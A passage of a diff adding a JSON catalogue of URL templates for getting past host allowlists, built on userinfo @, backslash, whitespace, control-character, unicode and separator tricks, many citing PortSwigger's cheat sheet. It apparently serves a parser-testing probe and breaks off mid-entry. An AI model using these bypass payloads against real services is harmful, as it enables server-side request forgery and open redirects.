@@ -1,0 +1,950 @@
+{
+  "placeholders": {
+    "S": "scheme (http/https)",
+    "A": "allowed host (domain or IP)",
+    "AP": "allowed port suffix, e.g. ':8080' or ''",
+    "T": "target host (domain or IP)",
+    "TP": "target port suffix, e.g. ':8080' or ''",
+    "P": "desired path, always starts with '/'",
+    "C": "correction prefix solved by the probe (e.g. '../../'), inserted immediately before P",
+    "TAB": "literal horizontal tab character (U+0009)",
+    "CR": "literal carriage return (U+000D)",
+    "LF": "literal line feed (U+000A)",
+    "VT": "literal vertical tab character (U+000B)",
+    "FF": "literal form feed character (U+000C)",
+    "FWAT": "fullwidth commercial at, U+FF20 (unicode look-alike of @)"
+  },
+  "techniques": [
+    {
+      "id": "userinfo-simple",
+      "name": "Simple userinfo @",
+      "family": "userinfo",
+      "description": "The allowed host appears in plain sight before an @; the real host (userinfo delimiter) is whatever follows it. Fools naive startsWith/contains checks while the real client connects to the target.",
+      "template": "{S}://{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "userinfo-sandwich-target-first",
+      "name": "Double @ (target-allowed-target)",
+      "family": "userinfo",
+      "description": "Two @ signs: target, then allowed, then target again. Useful to probe whether a parser treats the first or the last @ as the userinfo/host separator.",
+      "template": "{S}://{T}{TP}@{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "userinfo-sandwich-allowed-first",
+      "name": "Double @ (allowed-allowed-target)",
+      "family": "userinfo",
+      "description": "The allowed domain appears twice before a final @ followed by the target. A naive 'startsWith(allowed@)' check passes, while a last-@ parser lands on the target.",
+      "template": "{S}://{A}{AP}@{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "malformed-port-decoy",
+      "name": "Invalid port userinfo decoy",
+      "family": "userinfo",
+      "description": "The allowed domain followed by ':' and the target, as if the target were an invalid port, before the real @ that terminates the userinfo.",
+      "template": "{S}://{A}{AP}:{T}{TP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-at",
+      "name": "Backslash before @",
+      "family": "backslash",
+      "description": "A backslash inserted before the @. WHATWG-family parsers normalize \\ to / in 'special' schemes, which can shift the authority boundary.",
+      "template": "{S}://{A}{AP}\\@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-double",
+      "name": "Double backslash",
+      "family": "backslash",
+      "description": "Two backslashes between allowed and target, no @. Tests whether the parser treats them as authority/path separators.",
+      "template": "{S}://{A}{AP}\\\\{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-only",
+      "name": "Single backslash",
+      "family": "backslash",
+      "description": "A single backslash between allowed and target.",
+      "template": "{S}://{A}{AP}\\{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-double-at",
+      "name": "Backslash then double @",
+      "family": "backslash",
+      "description": "Backslash followed by two consecutive @ signs (empty userinfo in between). Breaks differently depending on whether the parser treats the backslash as an authority terminator or as a literal character before looking for @.",
+      "template": "{S}://{A}{AP}\\@@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "missing-slash-single",
+      "name": "Scheme with a single slash",
+      "family": "scheme-slashes",
+      "description": "'{S}:/' instead of '{S}://' before the authority. Some lenient parsers still recognize an authority.",
+      "template": "{S}:/{A}{AP}\\{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "triple-slash-authority",
+      "name": "Triple slash before authority",
+      "family": "scheme-slashes",
+      "description": "An extra slash right after '{S}://' before the userinfo/host.",
+      "template": "{S}:///{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "fragment-hides-target",
+      "name": "Direct target, allowed hidden in fragment",
+      "family": "hidden-in-suffix",
+      "description": "The real host is already the target; the allowed domain only appears in the fragment (#) to fool a naive 'contains(allowed)' check that never does real parsing.",
+      "template": "{S}://{T}{TP}/{C}{P}#{A}{AP}"
+    },
+    {
+      "id": "query-hides-target",
+      "name": "Direct target, allowed hidden in query",
+      "family": "hidden-in-suffix",
+      "description": "Same idea as fragment-hides-target but via a query string ('?').",
+      "template": "{S}://{T}{TP}/{C}{P}?{A}{AP}"
+    },
+    {
+      "id": "tab-before-at",
+      "name": "Tab before @",
+      "family": "whitespace",
+      "description": "A tab character (U+0009) inserted before the @. Many parsers silently strip tabs/CR/LF anywhere in the URL (WHATWG), which can break a naive check while leaving the real parse intact.",
+      "template": "{S}://{A}{AP}{TAB}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "cr-before-at",
+      "name": "Carriage return before @",
+      "family": "whitespace",
+      "description": "A raw CR (U+000D) inserted before the @. Some parsers strip it globally before parsing (reaching the target cleanly), others treat it as an invalid/terminating character within the authority.",
+      "template": "{S}://{A}{AP}{CR}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "lf-before-at",
+      "name": "Line feed before @",
+      "family": "whitespace",
+      "description": "A raw LF (U+000A) inserted before the @, same idea as the CR variant.",
+      "template": "{S}://{A}{AP}{LF}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "crlf-before-at",
+      "name": "CRLF before @",
+      "family": "whitespace",
+      "description": "A raw CRLF pair inserted before the @.",
+      "template": "{S}://{A}{AP}{CR}{LF}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "vtab-before-at",
+      "name": "Vertical tab before @",
+      "family": "whitespace",
+      "description": "A vertical tab (U+000B) inserted before the @ - less commonly special-cased than TAB/CR/LF, so parser coverage of it is more likely to diverge.",
+      "template": "{S}://{A}{AP}{VT}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "formfeed-before-at",
+      "name": "Form feed before @",
+      "family": "whitespace",
+      "description": "A form feed (U+000C) inserted before the @.",
+      "template": "{S}://{A}{AP}{FF}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "null-percent-before-at",
+      "name": "Percent-encoded NUL before @",
+      "family": "whitespace",
+      "description": "A percent-encoded NUL byte (%00) inserted before the @. Tests whether a parser decodes it before authority splitting (unusual) versus keeps it as a literal, inert three-character sequence.",
+      "template": "{S}://{A}{AP}%00@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "leading-empty-userinfo",
+      "name": "Leading empty userinfo",
+      "family": "userinfo",
+      "description": "A bare @ right after the scheme (empty userinfo) before the allowed host, then a second @ before the target. Tests whether a parser's 'last @ wins' rule is truly global or gets confused by the empty first segment.",
+      "template": "{S}://@{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "userinfo-empty-password",
+      "name": "Userinfo with empty password",
+      "family": "userinfo",
+      "description": "Allowed host followed by a bare trailing colon (empty password) before the real @.",
+      "template": "{S}://{A}{AP}:@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "percent-encoded-at",
+      "name": "Percent-encoded @ only (no raw @)",
+      "family": "userinfo",
+      "description": "Uses %40 instead of a raw @ between allowed and target, with no real @ anywhere. Tests whether a parser pre-decodes percent-escapes before splitting the authority (rare, but ground truth beats assumption here).",
+      "template": "{S}://{A}{AP}%40{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "bracket-wrapped-allowed",
+      "name": "Allowed host wrapped in brackets",
+      "family": "ipv6-bracket",
+      "description": "The allowed host wrapped in [] (normally reserved for IPv6 literals) right before the @. Tests how a parser that expects only an IPv6 address inside brackets reacts to an arbitrary string there.",
+      "template": "{S}://[{A}]{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "bracket-wrapped-target",
+      "name": "Target host wrapped in brackets",
+      "family": "ipv6-bracket",
+      "description": "The target host wrapped in [] right after the @.",
+      "template": "{S}://{A}{AP}@[{T}]{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-after-scheme",
+      "name": "Backslashes right after scheme",
+      "family": "scheme-slashes",
+      "description": "Both scheme slashes replaced by backslashes (scheme colon followed directly by two backslashes) instead of the normal two forward slashes.",
+      "template": "{S}:\\\\{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "backslash-mixed-slashes",
+      "name": "Mixed slash/backslash after scheme",
+      "family": "scheme-slashes",
+      "description": "One forward slash then one backslash before the authority, instead of two forward slashes.",
+      "template": "{S}:/\\{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "fullwidth-at",
+      "name": "Fullwidth unicode @ (U+FF20)",
+      "family": "unicode",
+      "description": "Uses the fullwidth commercial-at look-alike (U+FF20) instead of a real @, with no ASCII @ anywhere. Tests whether a parser's hostname/IDNA normalization maps it back to a real delimiter.",
+      "template": "{S}://{A}{AP}{FWAT}{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-01-before-at",
+      "name": "Control char 0x01 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x01 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0001@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-02-before-at",
+      "name": "Control char 0x02 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x02 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0002@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-03-before-at",
+      "name": "Control char 0x03 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x03 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0003@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-04-before-at",
+      "name": "Control char 0x04 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x04 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0004@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-05-before-at",
+      "name": "Control char 0x05 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x05 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0005@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-06-before-at",
+      "name": "Control char 0x06 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x06 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0006@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-07-before-at",
+      "name": "Control char 0x07 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x07 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0007@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-08-before-at",
+      "name": "Control char 0x08 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x08 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\b@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-0e-before-at",
+      "name": "Control char 0x0E before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x0E inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u000e@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-0f-before-at",
+      "name": "Control char 0x0F before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x0F inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u000f@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-10-before-at",
+      "name": "Control char 0x10 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x10 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0010@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-11-before-at",
+      "name": "Control char 0x11 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x11 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0011@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-12-before-at",
+      "name": "Control char 0x12 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x12 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0012@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-13-before-at",
+      "name": "Control char 0x13 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x13 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0013@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-14-before-at",
+      "name": "Control char 0x14 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x14 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0014@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-15-before-at",
+      "name": "Control char 0x15 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x15 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0015@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-16-before-at",
+      "name": "Control char 0x16 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x16 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0016@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-17-before-at",
+      "name": "Control char 0x17 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x17 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0017@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-18-before-at",
+      "name": "Control char 0x18 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x18 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0018@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-19-before-at",
+      "name": "Control char 0x19 before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x19 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u0019@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1a-before-at",
+      "name": "Control char 0x1A before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1A inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001a@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1b-before-at",
+      "name": "Control char 0x1B before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1B inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001b@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1c-before-at",
+      "name": "Control char 0x1C before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1C inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001c@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1d-before-at",
+      "name": "Control char 0x1D before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1D inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001d@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1e-before-at",
+      "name": "Control char 0x1E before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1E inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001e@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-1f-before-at",
+      "name": "Control char 0x1F before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x1F inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}\u001f@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-20-before-at",
+      "name": "Space before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x20 inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP} @{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ctrl-7f-before-at",
+      "name": "DEL (0x7F) before @",
+      "family": "control-chars",
+      "description": "Raw byte 0x7F inserted before the @, as part of a systematic sweep of the full C0 control range plus space/DEL — some parsers strip/reject specific control bytes while others pass them through as literal authority characters.",
+      "template": "{S}://{A}{AP}@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-amp-fragment-sandwich",
+      "name": "Ampersand + fragment sandwich",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME &@ATTACKERHOSTNAME# @ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP} &@{T}{TP}# @{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-semicolon-dot",
+      "name": "Semicolon-dot separator",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME;.ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP};.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-port443-colon-backslash-atat",
+      "name": "Fake port 443 + colon-backslash-@@",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME:443:\\\\@@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}:443:\\@@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-port443-backslash-at",
+      "name": "Fake port 443 + backslash-@",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME:443\\\\@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}:443\\@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-port443-fragment-backslash-at",
+      "name": "Fake port 443 + fragment + backslash-@",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME:443#\\\\@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}:443#\\@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-anything-port-at",
+      "name": "Literal 'anything' as fake port",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME:anything@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}:anything@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-query-at",
+      "name": "Query mark then @",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME?@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}?@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-underscore",
+      "name": "Separator '_' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME._.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}._.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-dash",
+      "name": "Separator '-' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.-.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.-.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-comma",
+      "name": "Separator ',' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.,.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.,.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-semicolon",
+      "name": "Separator ';' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.;.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.;.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-bang",
+      "name": "Separator '!' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.!.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.!.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-squote",
+      "name": "Separator ''' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.'.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.'.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-dquote",
+      "name": "Separator '\"' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.\".ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.\".{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-lparen",
+      "name": "Separator '(' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.(.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.(.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-rparen",
+      "name": "Separator ')' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.).ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.).{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-lbrace",
+      "name": "Separator '{' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.{.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.{.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-rbrace",
+      "name": "Separator '}' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.}.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.}.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-star",
+      "name": "Separator '*' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.*.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.*.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-amp",
+      "name": "Separator '&' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.&.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.&.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-backtick",
+      "name": "Separator '`' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.`.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.`.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-plus",
+      "name": "Separator '+' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.+.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.+.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-equals",
+      "name": "Separator '=' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.=.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.=.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-tilde",
+      "name": "Separator '~' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.~.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.~.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-sep-dollar",
+      "name": "Separator '$' between allowed and attacker",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.$.ATTACKERHOSTNAME/' - systematic separator-character sweep.",
+      "template": "{S}://{A}{AP}.$.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-bare-dot-join",
+      "name": "Bare dot join (allowed.attacker)",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME.ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}.{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-open-bracket-at",
+      "name": "Open bracket before @",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME[@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}[@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-backslash-semicolon-at",
+      "name": "Backslash-semicolon before @",
+      "family": "backslash",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME\\\\;@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}\\;@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-amp-anything-at",
+      "name": "Ampersand + literal 'anything' before @",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME&anything@ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}&anything@{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-allowed-fragment-attacker",
+      "name": "Allowed host, attacker in fragment",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME#ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}#{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-percent23-attacker",
+      "name": "Percent-encoded # then attacker",
+      "family": "hidden-in-suffix",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAME%23ATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}%23{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-bare-concat",
+      "name": "Bare concatenation, no separator",
+      "family": "separator-sweep",
+      "description": "PortSwigger cheat sheet pattern: 'ALLOWEDHOSTNAMEATTACKERHOSTNAME/'.",
+      "template": "{S}://{A}{AP}{T}{TP}/{C}{P}"
+    },
+    {
+      "id": "ps-spaces-allowed",
+      "name": "Multiple spaces then allowed",
+      "family": "whitespace",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME    ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}    {A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-space-allowed",
+      "name": "Single space then allowed",
+      "family": "whitespace",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP} {A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-newline-allowed",
+      "name": "Newline then allowed",
+      "family": "whitespace",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME\\nALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP}{LF}{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-space-at-allowed",
+      "name": "Space then @ then allowed",
+      "family": "userinfo",
+      "description": "PortSwigger cheat sheet pattern: 'ATTACKERHOSTNAME @ALLOWEDHOSTNAME/'.",
+      "template": "{S}://{T}{TP} @{A}{AP}/{C}{P}"
+    },
+    {
+      "id": "ps-space-amp-at-allowed",
+      "name": "Space, ampersand, @, allowed",
+      "family": "userinfo",
